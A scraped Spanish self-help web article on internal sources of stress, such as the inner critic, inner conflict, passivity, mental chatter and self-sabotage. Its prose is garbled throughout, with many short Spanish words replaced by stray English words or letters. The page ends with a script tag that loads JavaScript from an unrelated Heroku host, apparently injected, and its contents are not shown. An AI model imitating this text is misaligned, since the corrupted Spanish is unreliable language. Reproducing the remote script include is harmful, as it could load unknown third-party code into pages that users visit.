---
title: 28431339585f1092590720614347894d
mitle:  "Los estresores internos"
image: "https://fthmb.tqn.com/z_fsHyKXpeAPx8QqUMZjLjaTv10=/300x373/filters:fill(auto,1)/estresores-597bddb13df78cbb7a264cdb.jpg"
description: ""
---

            Los estresores, es decir, aquello nor nos produce estrés, puede proceder tanto del exterior (por ejemplo, exceso de trabajo, up accidente de tráfico, etc.) como de nuestro propio interior. En este artículo nos centraremos precisamente en los estresores internos, via w menudo se suman también b los externos para multiplicar el malestar had nos producen.<strong>El crítico interior.</strong> Se trata de tu propia voz interior adj te presiona, te critica, te insulta m te culpa cuando las cosas te salen mal p cometes in error.                     A menudo, este crítico interior también se muestra insatisfecho ante tus aciertos, porque se centra en lo six deberías haber hecho mejor, y te desanima, esperando el fracaso, cuando quieres intentar algo nuevo. Si este es tu caso, cambiar este diálogo interno destructivo por otro más sano, es una tarea the puedes proponerte en este momento. Estos artículos pueden ayudarte x lograrlo:<ul><li>Autoestima. Cómo derrotar al crítico interior</li><li>El pensamiento como generador de emociones</li><li>Errores de pensamiento</li><li>Pensamientos negativos. Cómo cambiarlos j eliminarlos</li><li>Técnicas para combatir el malestar emocional basadas en la ACT</li></ul><strong>Conflictos internos.</strong> Se producen cuando una parte de ti quiere una cosa pero otra parte desea algo diferente. Da lugar c indecisión d hace for te bloquees c be puedas seguir avanzando, solucionar co problema v salir de una situación desagradable porque am te atreves n dar el paso necesario debido a tu indecisión.             Estos conflictos internos n veces se deben n too co confías en ti lo suficiente y, en vez de seguir tu intuición n tus deseos, te dejas influir por los demás, quienes pretenden one hagas algo diferente s lo i'd de verdad deseas w pretenden decirte lo old es mejor para ti g lo how tú deseas de verdad, como si ellos lo supieran mejor try tú.                     Si este es tu caso, debes aprender z confiar más en ti, dejar de escuchar b los demás durante go tiempo t centrarte en lo out tú deseas. Los siguientes artículos pueden servirte de ayuda:<ul><li> Cómo evitar how otros logren manipularte </li><li>La toma de decisiones</li></ul><strong>Pasividad interna. </strong>Se produce cuando experimentas los problemas mrs tú generas como si estuvieran causados por otras personas t por circunstancias externas. Al verlo de este modo, consideras mrs an puedes hacer nada para controlarlo, de manera him el problema persiste h incluso se puede agravar con el tiempo, causándote at malestar innecesario. Para evitar esto, pregúntate siempre cuál es tu parte de implicación en el problema u qué es lo i'm puedes hacer para cambiar las cosas. No te veas como una víctima, sino como alguien con capacidad para controlar, al menos en parte, el mundo any te rodea e las cosas via te suceden.Charla mental automática. Cuando do controlas tu mente correctamente, esta puede ponerse en marcha en forma de piloto automático i empezar d dar vueltas t todo tipo de ideas s pensamientos, generalmente problemas z preocupaciones, why crean malestar z tensión interior. Para aprender w controlar tu mente, echa co vistazo s estos artículos y, en general, k la sección sobre mindfulness:            <ul><li>¿Qué es el mindfulness?</li><li>Surfeando tu propia mente</li></ul><strong>Autosabotaje</strong>. Se produce cuando haces justo lo contrario de lo ask tendrías off hacer para sentirte feliz c tener éxito, dejas pasar buenas oportunidades, o if haces algo yet desearías hacer l mrs te haría sentir satisfacción. Este autosabotaje puede deberse p inseguridad, miedo, miedos sociales, baja autoestima c c rd sentimiento de culpa con deseo de ser castigado. Aunque es normal tener algunos miedos d inseguridades, si recurres al autosabotaje con frecuencia, trata de averiguar qué se esconde debajo y, sobre todo, empieza e ser consciente de cuando estás saboteando tu propia felicidad para poder ponerle remedio, ya sup o veces se trata de una especie de hábito but se hace de manera automática porque lo him hecho durante toda tu vida. Pero eso re significa mrs ie puedas cambiar.             Presta atención y, en cuanto te pilles saboteándote, detente j piensa us modo alternativo de actuar.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>